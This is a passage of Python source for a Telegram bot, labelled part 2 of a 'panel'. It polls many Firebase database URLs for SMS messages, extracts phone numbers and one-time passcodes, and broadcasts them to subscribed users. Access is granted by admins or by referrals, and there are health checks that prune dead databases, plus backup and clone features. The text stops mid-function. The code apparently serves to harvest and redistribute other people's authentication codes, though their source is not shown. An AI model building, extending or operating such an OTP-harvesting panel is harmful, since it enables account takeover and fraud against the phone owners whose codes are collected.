#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════╗
║          SHOWN X PANEL BOT — v3.0 ULTRA EDITION             ║
║   PART 2 — Handlers, Poll Loop, Background Tasks, main()    ║
╚══════════════════════════════════════════════════════════════╝
MERGE: Paste this directly after Part 1 (remove the PART 1 ENDS HERE comment).
"""

# ══════════════════════════════════════════════════════════════
#  OTP POLL LOOP
# ══════════════════════════════════════════════════════════════

async def poll_all_databases(bot) -> None:
    global first_run
    session = await get_http_session()

    async def _poll_one(name: str, url: str) -> None:
        try:
            entries = await fetch_firebase_sms(url, session)
            new_count = 0
            for entry in entries:
                uid = entry.get("_key", "")
                if not uid or uid in seen_ids:
                    continue
                if len(seen_ids) >= MAX_SEEN_IDS:
                    seen_ids.clear()
                seen_ids.add(uid)

                if first_run:
                    continue

                phone, otp = extract_otp_from_entry(entry)
                if not phone and not otp:
                    continue

                new_count += 1
                raw_msg = entry.get("message") or entry.get("body") or entry.get("text") or ""

                # Build alert text
                alert = (
                    f"<blockquote>{'─'*22}\n"
                    f"📡 <b>NEW OTP RECEIVED</b>\n"
                    f"{'─'*22}</blockquote>\n\n"
                    f"<blockquote>"
                    f"🗄 <b>DB:</b> {html_escape(name)}\n"
                    f"📱 <b>Phone:</b> <code>{html_escape(phone)}</code>\n"
                    f"🔑 <b>OTP:</b> <code>{html_escape(otp)}</code>\n"
                    f"💬 <b>Msg:</b> <code>{html_escape(str(raw_msg)[:200])}</code>\n"
                    f"🕐 <b>Time:</b> {datetime.now().strftime('%d %b %Y %H:%M:%S')}"
                    f"</blockquote>"
                )

                copy_btn = None
                if otp and _PTB_COPY_TEXT_BUTTON:
                    try:
                        copy_btn = InlineKeyboardMarkup([[
                            _PTB_COPY_TEXT_BUTTON(otp)
                        ]])
                    except Exception:
                        copy_btn = None

                # Send to all allowed users + admins
                targets = set(allowed_users) | ADMIN_IDS
                for uid2 in targets:
                    try:
                        await bot.send_message(
                            uid2, alert,
                            parse_mode=ParseMode.HTML,
                            reply_markup=copy_btn,
                        )
                    except (Forbidden, BadRequest):
                        pass
                    except RetryAfter as e:
                        await asyncio.sleep(e.retry_after)

                # Live monitor broadcast
                if otp:
                    await broadcast_otp_alert(bot, phone, otp, name)

                # Log to user hub for all allowed users
                for uid2 in targets:
                    try:
                        await log_number_used(uid2, phone, otp, name, url)
                    except Exception:
                        pass

                # Activity log
                await log_activity(0, "otp_received", f"{name}|{phone}|{otp}")

        except Exception as e:
            log.debug("Poll error for %s: %s", name, e)

    tasks = [_poll_one(name, url) for name, url in list(DATABASES.items())]
    await asyncio.gather(*tasks, return_exceptions=True)
    first_run = False


async def poll_loop(bot) -> None:
    log.info("OTP poll loop started")
    while True:
        try:
            interval = await get_setting_int("poll_interval", POLL_INTERVAL)
            await poll_all_databases(bot)
            await asyncio.sleep(max(5, interval))
        except asyncio.CancelledError:
            log.info("Poll loop cancelled")
            break
        except Exception as e:
            log.error("Poll loop error: %s", e)
            await asyncio.sleep(10)


# ══════════════════════════════════════════════════════════════
#  AUTO BACKUP LOOP
# ══════════════════════════════════════════════════════════════

async def auto_backup_loop(bot) -> None:
    log.info("Auto backup loop started")
    while True:
        try:
            enabled = await get_setting_bool("auto_db_enabled", False)
            if enabled:
                interval = await get_setting_int("auto_db_interval", 3600)
                target_raw = await get_setting("auto_db_group", "")
                if target_raw:
                    try:
                        target = int(target_raw)
                        await send_backup(bot, target)
                        log.info("Auto backup sent to %s", target)
                    except Exception as e:
                        log.error("Auto backup failed: %s", e)
                await asyncio.sleep(max(300, interval))
            else:
                await asyncio.sleep(60)
        except asyncio.CancelledError:
            break
        except Exception as e:
            log.error("Auto backup loop error: %s", e)
            await asyncio.sleep(60)


# ══════════════════════════════════════════════════════════════
#  FIREBASE HEALTH CHECK LOOP
# ══════════════════════════════════════════════════════════════

async def firebase_health_loop(bot) -> None:
    log.info("Firebase health loop started")
    while True:
        try:
            session = await get_http_session()
            results = await run_firebase_health_check(session)
            dead = sum(1 for s in results.values() if s == "dead")
            alive = sum(1 for s in results.values() if s == "alive")
            log.info("Firebase health: %d alive, %d dead", alive, dead)
            await asyncio.sleep(FB_HEALTH_INTERVAL)
        except asyncio.CancelledError:
            break
        except Exception as e:
            log.error("Health loop error: %s", e)
            await asyncio.sleep(60)


# ══════════════════════════════════════════════════════════════
#  GUARD: Check access before handler
# ══════════════════════════════════════════════════════════════

async def guard_access(update: Update, context: ContextTypes.DEFAULT_TYPE) -> bool:
    user = update.effective_user
    if not user:
        return False
    await ensure_user(user.id, user.username, user.first_name)
    if await has_access(user.id):
        return True
    ref_link = f"https://t.me/{BOT_USERNAME.lstrip('@')}?start=ref_{user.id}"
    req = await get_setting_int("required_referrals", 2)
    count = await referral_count(user.id)
    text = (
        f"<blockquote>{'─'*22}\n"
        f"🔒 <b>ACCESS REQUIRED</b>\n"
        f"{'─'*22}</blockquote>\n\n"
        f"<blockquote>"
        f"⚡ You need access to use this panel.\n\n"
        f"📨 <b>Option 1:</b> Contact owner {html_escape(await get_setting('owner_contact', OWNER_CONTACT))}\n\n"
        f"🔗 <b>Option 2:</b> Refer {req} friends:\n"
        f"<code>{html_escape(ref_link)}</code>\n\n"
        f"👥 Your referrals: <b>{count}/{req}</b>"
        f"</blockquote>"
    )
    if update.callback_query:
        try:
            await update.callback_query.answer("🔒 Access required", show_alert=True)
        except Exception:
            pass
    elif update.message:
        await update.message.reply_text(text, parse_mode=ParseMode.HTML)
    return False


# ══════════════════════════════════════════════════════════════
#  /start HANDLER
# ══════════════════════════════════════════════════════════════

async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user = update.effective_user
    if not user:
        return
    is_new = await ensure_user(user.id, user.username, user.first_name)
    await log_activity(user.id, "start", "")

    # Referral handling
    args = context.args or []
    if args and args[0].startswith("ref_"):
        try:
            referrer_id = int(args[0][4:])
            if referrer_id != user.id:
                async with db() as conn:
                    row = conn.execute(
                        "SELECT referrals FROM all_users WHERE user_id=?", (referrer_id,)
                    ).fetchone()
                    refs = json.loads(row["referrals"] or "[]") if row else []
                    if str(user.id) not in [str(x) for x in refs]:
                        refs.append(user.id)
                        conn.execute(
                            "UPDATE all_users SET referrals=? WHERE user_id=?",
                            (json.dumps(refs), referrer_id),
                        )
        except Exception:
            pass

    welcome_text = await build_welcome_text(user)
    wc = await get_welcome_config()
    media_id = wc.get("media_file_id")
    media_type = wc.get("media_type") or "photo"
    admin = is_admin(user.id)
    kb = main_menu_keyboard(admin)

    if media_id and RICH_MESSAGES_ENABLED:
        try:
            await send_rich_or_fallback(
                context.bot, user.id,
                rich_html=welcome_text,
                fallback_html=welcome_text,
                reply_markup=None,
                media_file_id=media_id,
                media_type=media_type,
            )
            await update.message.reply_text("🏠 Main Menu", reply_markup=kb)
            return
        except Exception:
            pass

    if media_id:
        try:
            if media_type == "photo":
                await context.bot.send_photo(user.id, media_id, caption=welcome_text, parse_mode=ParseMode.HTML, reply_markup=kb)
            elif media_type in ("video",):
                await context.bot.send_video(user.id, media_id, caption=welcome_text, parse_mode=ParseMode.HTML, reply_markup=kb)
            elif media_type in ("animation", "gif"):
                await context.bot.send_animation(user.id, media_id, caption=welcome_text, parse_mode=ParseMode.HTML, reply_markup=kb)
            else:
                await update.message.reply_text(welcome_text, parse_mode=ParseMode.HTML, reply_markup=kb)
            return
        except Exception:
            pass

    await update.message.reply_text(welcome_text, parse_mode=ParseMode.HTML, reply_markup=kb)


# ══════════════════════════════════════════════════════════════
#  /panel — DB PANEL (Inline keyboard with status icons)
# ══════════════════════════════════════════════════════════════

async def cmd_panel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not await guard_access(update, context):
        return
    user = update.effective_user
    total_dbs = len(DATABASES)
    alive_count = sum(1 for h in _fb_health.values() if h.get("status") == "alive")
    brand = await get_setting("bot_brand_name", BOT_BRAND_NAME)

    text = ui_screen(
        "📡", f"{brand} — OTP PANEL",
        ui_box(
            ui_kv("🗄", "Total DBs", str(total_dbs)),
            ui_kv("🟢", "Alive", str(alive_count)),
            ui_kv("🔴", "Dead", str(total_dbs - alive_count)),
            ui_kv("👥", "Users", str(len(allowed_users))),
        ),
        ui_box(f"💬 <i>{random.choice(PANEL_QUOTES)}</i>"),
        subtitle="Select a database to view OTPs",
        footer=f"Last updated: {datetime.now().strftime('%H:%M:%S')}",
    )
    kb = db_panel_keyboard(0)
    await update.message.reply_text(text, parse_mode=ParseMode.HTML, reply_markup=kb)


# ══════════════════════════════════════════════════════════════
#  /status
# ══════════════════════════════════════════════════════════════

async def cmd_status(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not await guard_access(update, context):
        return
    total = len(DATABASES)
    alive = sum(1 for h in _fb_health.values() if h.get("status") == "alive")
    dead  = sum(1 for h in _fb_health.values() if h.get("status") == "dead")
    unk   = total - alive - dead
    poll_int = await get_setting_int("poll_interval", POLL_INTERVAL)
    monitor_on = update.effective_user.id in _monitor_subs

    text = ui_screen(
        "📊", "SYSTEM STATUS",
        ui_box(
            ui_kv("🗄", "Total DBs", str(total)),
            ui_kv("🟢", "Alive", str(alive)),
            ui_kv("🔴", "Dead", str(dead)),
            ui_kv("⚪", "Unchecked", str(unk)),
        ),
        ui_box(
            ui_kv("⏱", "Poll Interval", f"{poll_int}s"),
            ui_kv("👁", "Seen IDs", str(len(seen_ids))),
            ui_status("Live Monitor", monitor_on),
        ),
        footer=f"🕐 {datetime.now().strftime('%d %b %Y %H:%M:%S')}",
    )
    kb = InlineKeyboardMarkup([
        [_ikb("🔥 Run Health Check", callback_data="db:health", style="success")],
        [_ikb("📡 Toggle Monitor", callback_data="monitor:toggle", style="primary")],
    ])
    await update.message.reply_text(text, parse_mode=ParseMode.HTML, reply_markup=kb)


# ══════════════════════════════════════════════════════════════
#  /hub — USER HUB
# ══════════════════════════════════════════════════════════════

async def cmd_hub(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not await guard_access(update, context):
        return
    user = update.effective_user
    await _show_user_hub(update, context, user.id, 0, edit=False)


async def _show_user_hub(
    update: Update, context: ContextTypes.DEFAULT_TYPE,
    user_id: int, page: int, edit: bool = False
) -> None:
    stats = await get_user_hub_stats(user_id)
    rows, total = await get_user_hub(user_id, page, 8)
    total_pages = max(1, (total + 7) // 8)

    # Build rows
    if rows:
        lines = []
        for r in rows:
            ts = r.get("timestamp", "")[:16].replace("T", " ")
            phone = r.get("phone") or "—"
            otp = r.get("otp") or "—"
            db_name = r.get("db_name") or "—"
            lines.append(
                f"📱 <code>{html_escape(phone)}</code> | "
                f"🔑 <code>{html_escape(otp)}</code>\n"
                f"   🗄 {html_escape(db_name[:20])} · 🕐 {ts}"
            )
        entries_block = ui_box("\n\n".join(lines))
    else:
        entries_block = ui_box("📭 No number history yet.")

    text = ui_screen(
        "👤", "USER HUB",
        ui_box(
            ui_kv("📊", "Total Hits", str(stats["total"])),
            ui_kv("📱", "Unique Numbers", str(stats["unique_phones"])),
            ui_kv("🕐", "Last Active", fmt_date(stats["last_active"])),
        ),
        entries_block,
        subtitle=f"Page {page+1} of {total_pages}",
    )

    nav = []
    if page > 0:
        nav.append(_ikb("⬅ Prev", callback_data=f"hub:page:{page-1}", style="primary"))
    nav.append(_ikb(f"{page+1}/{total_pages}", callback_data="noop", style="primary"))
    if page < total_pages - 1:
        nav.append(_ikb("Next ➡", callback_data=f"hub:page:{page+1}", style="primary"))

    rows_kb = []
    if nav:
        rows_kb.append(nav)
    rows_kb.append([_ikb("🗑 Clear My History", callback_data="hub:clear", style="danger")])
    rows_kb.append(back_row("home"))
    kb = InlineKeyboardMarkup(rows_kb)

    if edit and update.callback_query:
        try:
            await update.callback_query.edit_message_text(text, parse_mode=ParseMode.HTML, reply_markup=kb)
        except BadRequest:
            pass
    else:
        await update.message.reply_text(text, parse_mode=ParseMode.HTML, reply_markup=kb)


# ══════════════════════════════════════════════════════════════
#  /admin — ADMIN PANEL
# ══════════════════════════════════════════════════════════════

async def cmd_admin(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("⛔ Admins only.")
        return
    brand = await get_setting("bot_brand_name", BOT_BRAND_NAME)
    total_dbs = len(DATABASES)
    alive = sum(1 for h in _fb_health.values() if h.get("status") == "alive")
    total_users = 0
    async with db() as conn:
        total_users = conn.execute("SELECT COUNT(*) FROM all_users").fetchone()[0]
    text = ui_screen(
        "👑", f"{brand} — ADMIN PANEL",
        ui_box(
            ui_kv("🗄", "Total DBs", str(total_dbs)),
            ui_kv("🟢", "Alive", str(alive)),
            ui_kv("👥", "Total Users", str(total_users)),
            ui_kv("🔑", "Allowed", str(len(allowed_users))),
        ),
        footer="Select a section below",
    )
    await update.message.reply_text(
        text, parse_mode=ParseMode.HTML,
        reply_markup=admin_menu_keyboard(),
    )


# ══════════════════════════════════════════════════════════════
#  TEXT HANDLER — Route reply keyboard
# ══════════════════════════════════════════════════════════════

async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    text = (update.message.text or "").strip()
    user = update.effective_user

    # Check pending action (multi-step flows)
    pa = pending_action.get(user.id)
    if pa:
        await _handle_pending(update, context, pa, text)
        return

    # Route reply keyboard
    routes = {
        "📡 Panel":          cmd_panel,
        "📊 Status":         cmd_status,
        "👤 My Hub":         cmd_hub,
        "❓ Help":           cmd_help,
        "👑 Admin Panel":    cmd_admin,
        "🗄 DB Manager":     _admin_db_manager,
        "🔥 Firebase Health":_admin_health_text,
        "📡 Live Monitor":   _admin_monitor_text,
        "💾 Backup":         _admin_backup_text,
        "🧬 Clone Manager":  _admin_clone_text,
        "🎨 Customize":      _admin_customize_text,
        "👥 Users":          _admin_users_text,
        "📊 Stats":          _admin_stats_text,
        "⚙ Settings":       _admin_settings_text,
        "⬅ Back":           _go_home,
    }
    fn = routes.get(text)
    if fn:
        await fn(update, context)
    else:
        # Unknown input while no pending action — show help
        pass


# ══════════════════════════════════════════════════════════════
#  PENDING ACTION HANDLER (multi-step input)
# ══════════════════════════════════════════════════════════════

async def _handle_pending(
    update: Update, context: ContextTypes.DEFAULT_TYPE,
    pa: dict, text: str,
) -> None:
    user = update.effective_user
    action = pa.get("action")

    if action == "add_db":
        # Expect: "DB_NAME https://url"
        parts = text.strip().split(None, 1)
        if len(parts) != 2 or not parts[1].startswith("http"):
            await update.message.reply_text(
                "❌ Format: <b>DB_NAME https://your-firebase-url</b>",
                parse_mode=ParseMode.HTML,
            )
            return
        name, url = parts
        DATABASES[name] = url
        pending_action.pop(user.id, None)
        await update.message.reply_text(
            f"✅ <b>Added:</b> <code>{html_escape(name)}</code>",
            parse_mode=ParseMode.HTML,
        )

    elif action == "grant_user":
        try:
            uid = int(text.strip())
            await grant_access(uid, user.id)
            pending_action.pop(user.id, None)
            await update.message.reply_text(
                f"✅ Access granted to <code>{uid}</code>",
                parse_mode=ParseMode.HTML,
            )
        except ValueError:
            await update.message.reply_text("❌ Send a valid user ID (numbers only)")

    elif action == "revoke_user":
        try:
            uid = int(text.strip())
            await revoke_access(uid)
            pending_action.pop(user.id, None)
            await update.message.reply_text(
                f"🚫 Access revoked for <code>{uid}</code>",
                parse_mode=ParseMode.HTML,
            )
        except ValueError:
            await update.message.reply_text("❌ Send a valid user ID")

    elif action == "set_welcome_text":
        await set_welcome_config(text=text)
        pending_action.pop(user.id, None)
        await update.message.reply_text(
            "✅ <b>Welcome text updated!</b>",
            parse_mode=ParseMode.HTML,
        )

    elif action == "set_backup_target":
        try:
            chat_id = int(text.strip())
            await set_setting("auto_db_group", str(chat_id))
            pending_action.pop(user.id, None)
            await update.message.reply_text(
                f"✅ Backup target set to <code>{chat_id}</code>",
                parse_mode=ParseMode.HTML,
            )
        except ValueError:
            await update.message.reply_text("❌ Send a valid chat ID")

    elif action == "clone_db":
        # Expect: "SOURCE_NAME NEW_NAME"
        parts = text.strip().split(None, 1)
        if len(parts) != 2:
            await update.message.reply_text(
                "❌ Format: <b>SOURCE_NAME NEW_NAME</b>",
                parse_mode=ParseMode.HTML,
            )
            return
        src, new = parts
        ok = await clone_database(src, new)
        pending_action.pop(user.id, None)
        if ok:
            await update.message.reply_text(
                f"✅ Cloned <code>{html_escape(src)}</code> → <code>{html_escape(new)}</code>",
                parse_mode=ParseMode.HTML,
            )
        else:
            await update.message.reply_text(f"❌ Source <code>{html_escape(src)}</code> not found.")

    elif action == "set_poll_interval":
        try:
            val = int(text.strip())
            if val < 5:
                val = 5
            await set_setting("poll_interval", str(val))
            pending_action.pop(user.id, None)
            await update.message.reply_text(
                f"✅ Poll interval set to <b>{val}s</b>",
                parse_mode=ParseMode.HTML,
            )
        except ValueError:
            await update.message.reply_text("❌ Send a number (seconds)")

    elif action == "broadcast":
        pending_action.pop(user.id, None)
        async with db() as conn:
            rows = conn.execute("SELECT user_id FROM all_users").fetchall()
        targets = [r["user_id"] for r in rows]
        sent, failed = 0, 0
        for tid in targets:
            try:
                await context.bot.send_message(tid, text, parse_mode=ParseMode.HTML)
                sent += 1
                await asyncio.sleep(0.05)  # Flood control
            except Exception:
                failed += 1
        await update.message.reply_text(
            f"📡 <b>Broadcast done</b>\n✅ Sent: <b>{sent}</b> | ❌ Failed: <b>{failed}</b>",
            parse_mode=ParseMode.HTML,
        )

    elif action == "set_refs_required":
        try:
            val = max(1, int(text.strip()))
            await set_setting("required_referrals", str(val))
            pending_action.pop(user.id, None)
            await update.message.reply_text(
                f"✅ Referrals required set to <b>{val}</b>",
                parse_mode=ParseMode.HTML,
            )
        except ValueError:
            await update.message.reply_text("❌ Send a number (e.g. 2)")

    elif action == "set_brand":
        name = text.strip()[:50]
        await set_setting("bot_brand_name", name)
        pending_action.pop(user.id, None)
        await update.message.reply_text(
            f"✅ Brand name set to <b>{html_escape(name)}</b>",
            parse_mode=ParseMode.HTML,
        )


# Photo/video handler for welcome media
async def handle_media(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user = update.effective_user
    pa = pending_action.get(user.id)
    if not pa or pa.get("action") != "set_welcome_media":
        return
    msg = update.message
    if msg.photo:
        fid = msg.photo[-1].file_id
        mt = "photo"
    elif msg.video:
        fid = msg.video.file_id
        mt = "video"
    elif msg.animation:
        fid = msg.animation.file_id
        mt = "animation"
    else:
        return
    await set_welcome_config(media_file_id=fid, media_type=mt)
    pending_action.pop(user.id, None)
    await update.message.reply_text(
        f"✅ <b>Welcome media updated!</b> Type: <code>{mt}</code>",
        parse_mode=ParseMode.HTML,
    )


# ══════════════════════════════════════════════════════════════
#  ADMIN TEXT MENU HANDLERS
# ══════════════════════════════════════════════════════════════

async def _admin_db_manager(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not is_admin(update.effective_user.id):
        return
    text = ui_screen(
        "🗄", "DATABASE MANAGER",
        ui_box(
            ui_kv("📦", "Total DBs", str(len(DATABASES))),
            ui_kv("🟢", "Alive", str(sum(1 for h in _fb_health.values() if h.get("status") == "alive"))),
            ui_kv("🔴", "Dead", str(sum(1 for h in _fb_health.values() if h.get("status") == "dead"))),
        ),
        subtitle="Manage your Firebase databases",
    )
    await update.message.reply_text(
        text, parse_mode=ParseMode.HTML,
        reply_markup=db_panel_keyboard(0),
    )


async def _admin_health_text(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not is_admin(update.effective_user.id):
        return
    await update.message.reply_text(
        "⏳ <b>Running Firebase health check...</b>",
        parse_mode=ParseMode.HTML,
    )
    session = await get_http_session()
    results = await run_firebase_health_check(session)
    alive = sum(1 for s in results.values() if s == "alive")
    dead = sum(1 for s in results.values() if s == "dead")
    lines = []
    for name, status in results.items():
        icon = "🟢" if status == "alive" else "🔴"
        lines.append(f"{icon} {html_escape(name[:30])}")
    block = ui_box("\n".join(lines[:30]))
    if len(lines) > 30:
        block += f"\n<i>...and {len(lines)-30} more</i>"
    text = ui_screen(
        "🔥", "FIREBASE HEALTH REPORT",
        ui_box(
            ui_kv("🟢", "Alive", str(alive)),
            ui_kv("🔴", "Dead", str(dead)),
            ui_kv("📊", "Total", str(len(results))),
        ),
        block,
        footer=f"Checked: {datetime.now().strftime('%H:%M:%S')}",
    )
    kb = InlineKeyboardMarkup([
        [_ikb("🗑 Remove All Dead", callback_data="db:remove_dead", style="danger")],
        [_ikb("🔄 Recheck", callback_data="db:health", style="success")],
    ])
    await update.message.reply_text(text, parse_mode=ParseMode.HTML, reply_markup=kb)


async def _admin_monitor_text(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not is_admin(update.effective_user.id):
        return
    user_id = update.effective_user.id
    is_on = user_id in _monitor_subs
    text = ui_screen(
        "📡", "LIVE MONITOR",
        ui_box(
            ui_status("Your Monitor", is_on),
            ui_kv("👥", "Subscribers", str(len(_monitor_subs))),
        ),
        subtitle="Get live OTP alerts as they arrive",
    )
    kb = InlineKeyboardMarkup([
        [_ikb(
            "🔴 Turn Off" if is_on else "🟢 Turn On",
            callback_data="monitor:toggle",
            style="danger" if is_on else "success",
        )],
    ])
    await update.message.reply_text(text, parse_mode=ParseMode.HTML, reply_markup=kb)


async def _admin_backup_text(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not is_admin(update.effective_user.id):
        return
    history = await get_backup_history(5)
    auto_on = await get_setting_bool("auto_db_enabled", False)
    interval = await get_setting_int("auto_db_interval", 3600)
    target = await get_setting("auto_db_group", "")

    if history:
        lines = []
        for h in history:
            sz = fmt_size(h.get("size_bytes") or 0)
            ts = fmt_date(h.get("timestamp"))
            lines.append(f"📦 {ts} · {sz}")
        hist_block = ui_box("\n".join(lines))
    else:
        hist_block = ui_box("📭 No backups yet.")

    text = ui_screen(
        "💾", "BACKUP MANAGER",
        ui_box(
            ui_status("Auto Backup", auto_on),
            ui_kv("⏱", "Interval", f"{interval//3600}h {(interval%3600)//60}m"),
            ui_kv("📤", "Target Chat", target or "Not set"),
        ),
        hist_block,
        subtitle="Compressed gzip backups",
    )
    kb = InlineKeyboardMarkup([
        [_ikb("📤 Backup Now", callback_data="backup:now", style="success")],
        [
            _ikb(
                "🔴 Disable" if auto_on else "🟢 Enable",
                callback_data="backup:toggle_auto",
                style="danger" if auto_on else "success",
            ),
            _ikb("🎯 Set Target", callback_data="backup:set_target", style="primary"),
        ],
        [_ikb("📋 Full History", callback_data="backup:history", style="primary")],
    ])
    await update.message.reply_text(text, parse_mode=ParseMode.HTML, reply_markup=kb)


async def _admin_clone_text(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not is_admin(update.effective_user.id):
        return
    clones = await get_cloned_panels()
    if clones:
        lines = []
        for c in clones[:10]:
            lines.append(
                f"🧬 <b>{html_escape(c['name'])}</b>\n"
                f"   ← {html_escape(c.get('source_name') or '?')} · {fmt_date(c.get('created_at'))}"
            )
        clones_block = ui_box("\n\n".join(lines))
    else:
        clones_block = ui_box("📭 No clones yet.")

    text = ui_screen(
        "🧬", "CLONE MANAGER",
        ui_box(ui_kv("📦", "Total Clones", str(len(clones)))),
        clones_block,
        subtitle="Duplicate DB configs under new names",
    )
    kb = InlineKeyboardMarkup([
        [_ikb("➕ Clone a DB", callback_data="clone:start", style="success")],
        [_ikb("📋 All Clones", callback_data="clone:list:0", style="primary")],
    ])
    await update.message.reply_text(text, parse_mode=ParseMode.HTML, reply_markup=kb)


async def _admin_customize_text(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not is_admin(update.effective_user.id):
        return
    wc = await get_welcome_config()
    has_media = bool(wc.get("media_file_id"))
    has_text = bool(wc.get("text"))
    brand = await get_setting("bot_brand_name", BOT_BRAND_NAME)
    owner_contact = await get_setting("owner_contact", OWNER_CONTACT)

    text = ui_screen(
        "🎨", "CUSTOMIZE STUDIO",
        ui_box(
            ui_kv("🏷", "Brand Name", html_escape(brand)),
            ui_kv("👑", "Owner Contact", html_escape(owner_contact)),
            ui_status("Welcome Text", has_text),
            ui_status("Welcome Media", has_media),
            ui_kv("🖼", "Media Type", html_escape(wc.get("media_type") or "—")),
        ),
        subtitle="Customize welcome screen & bot identity",
    )
    kb = InlineKeyboardMarkup([
        [_ikb("✏ Edit Welcome Text", callback_data="cust:edit_text", style="primary")],
        [_ikb("🖼 Set Welcome Media", callback_data="cust:edit_media", style="primary")],
        [_ikb("🗑 Clear Media", callback_data="cust:clear_media", style="danger")],
        [_ikb("👁 Preview Welcome", callback_data="cust:preview", style="success")],
        [_ikb("🏷 Change Brand Name", callback_data="cust:brand", style="primary")],
    ])
    await update.message.reply_text(text, parse_mode=ParseMode.HTML, reply_markup=kb)


async def _admin_users_text(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not is_admin(update.effective_user.id):
        return
    async with db() as conn:
        total = conn.execute("SELECT COUNT(*) FROM all_users").fetchone()[0]
    text = ui_screen(
        "👥", "USER MANAGER",
        ui_box(
            ui_kv("👥", "Total Users", str(total)),
            ui_kv("🔑", "Allowed", str(len(allowed_users))),
        ),
    )
    kb = InlineKeyboardMarkup([
        [
            _ikb("✅ Grant Access", callback_data="user:grant", style="success"),
            _ikb("🚫 Revoke Access", callback_data="user:revoke", style="danger"),
        ],
        [_ikb("📋 Allowed List", callback_data="user:list:0", style="primary")],
        [_ikb("📡 Broadcast", callback_data="user:broadcast", style="primary")],
    ])
    await update.message.reply_text(text, parse_mode=ParseMode.HTML, reply_markup=kb)


async def _admin_stats_text(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not is_admin(update.effective_user.id):
        return
    async with db() as conn:
        total_users  = conn.execute("SELECT COUNT(*) FROM all_users").fetchone()[0]
        total_otps   = conn.execute("SELECT COUNT(*) FROM user_hub").fetchone()[0]
        total_phones = conn.execute("SELECT COUNT(DISTINCT phone) FROM user_hub").fetchone()[0]
        backups      = conn.execute("SELECT COUNT(*) FROM backup_history").fetchone()[0]
        clones       = conn.execute("SELECT COUNT(*) FROM cloned_panels").fetchone()[0]
        today_otps   = conn.execute(
            "SELECT COUNT(*) FROM user_hub WHERE timestamp >= ?",
            (datetime.utcnow().strftime("%Y-%m-%d"),)
        ).fetchone()[0]

    text = ui_screen(
        "📊", "STATS DASHBOARD",
        ui_box(
            ui_kv("👥", "Total Users", str(total_users)),
            ui_kv("🔑", "Allowed", str(len(allowed_users))),
            ui_kv("🗄", "Total DBs", str(len(DATABASES))),
            ui_kv("🧬", "Clones", str(clones)),
        ),
        ui_box(
            ui_kv("📱", "Total OTPs", str(total_otps)),
            ui_kv("📅", "Today OTPs", str(today_otps)),
            ui_kv("📞", "Unique Phones", str(total_phones)),
            ui_kv("💾", "Backups Made", str(backups)),
        ),
        footer=f"🕐 {datetime.now().strftime('%d %b %Y %H:%M:%S')}",
    )
    await update.message.reply_text(text, parse_mode=ParseMode.HTML)


async def _admin_settings_text(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not is_admin(update.effective_user.id):
        return
    grant_req    = await get_setting_bool("grant_access_required", True)
    ref_en       = await get_setting_bool("referral_enabled", True)
    ref_req      = await get_setting_int("required_referrals", 2)
    poll_int     = await get_setting_int("poll_interval", POLL_INTERVAL)
    auto_bk      = await get_setting_bool("auto_db_enabled", False)

    text = ui_screen(
        "⚙", "SETTINGS",
        ui_box(
            ui_status("Access Control", grant_req),
            ui_status("Referral System", ref_en),
            ui_kv("👥", "Refs Required", str(ref_req)),
            ui_kv("⏱", "Poll Interval", f"{poll_int}s"),
            ui_status("Auto Backup", auto_bk),
        ),
    )
    kb = InlineKeyboardMarkup([
        [_ikb(
            "🔴 Disable Access Control" if grant_req else "🟢 Enable Access Control",
            callback_data="settings:toggle_grant",
            style="danger" if grant_req else "success",
        )],
        [_ikb(
            "🔴 Disable Referrals" if ref_en else "🟢 Enable Referrals",
            callback_data="settings:toggle_referral",
            style="danger" if ref_en else "success",
        )],
        [_ikb("⏱ Set Poll Interval", callback_data="settings:poll", style="primary")],
        [_ikb("🔢 Set Refs Required", callback_data="settings:refs", style="primary")],
    ])
    await update.message.reply_text(text, parse_mode=ParseMode.HTML, reply_markup=kb)


async def _go_home(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    admin = is_admin(update.effective_user.id)
    await update.message.reply_text(
        "🏠 Main Menu",
        reply_markup=main_menu_keyboard(admin),
    )


# ══════════════════════════════════════════════════════════════
#  /help
# ══════════════════════════════════════════════════════════════

async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    brand = await get_setting("bot_brand_name", BOT_BRAND_NAME)
    text = ui_screen(
        "❓", f"{brand} — HELP",
        ui_box(
            "📡 <b>Panel</b> — Browse all DBs + live status icons",
            "📊 <b>Status</b> — System health overview",
            "👤 <b>My Hub</b> — Your full number history",
            "❓ <b>Help</b> — This screen",
        ),
        ui_box(
            "🗄 <b>DB Manager</b> — Add/remove/view DBs",
            "🔥 <b>Firebase Health</b> — Ping all DBs live",
            "📡 <b>Live Monitor</b> — Real-time OTP alerts",
            "💾 <b>Backup</b> — Manual/auto gzip backups",
            "🧬 <b>Clone Manager</b> — Duplicate DB configs",
            "🎨 <b>Customize</b> — Welcome text + media",
            "👥 <b>Users</b> — Grant/revoke access",
            "📊 <b>Stats</b> — Dashboard",
        ),
        subtitle="All commands available via reply keyboard",
    )
    await update.message.reply_text(text, parse_mode=ParseMode.HTML)


# ══════════════════════════════════════════════════════════════
#  CALLBACK QUERY HANDLER
# ══════════════════════════════════════════════════════════════

async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    q = update.callback_query
    await q.answer()
    data = q.data or ""
    user = q.from_user

    # ── no-op ──────────────────────────────────────────────────
    if data == "noop":
        return

    # ── home ───────────────────────────────────────────────────
    if data == "home":
        admin = is_admin(user.id)
        try:
            await q.message.delete()
        except Exception:
            pass
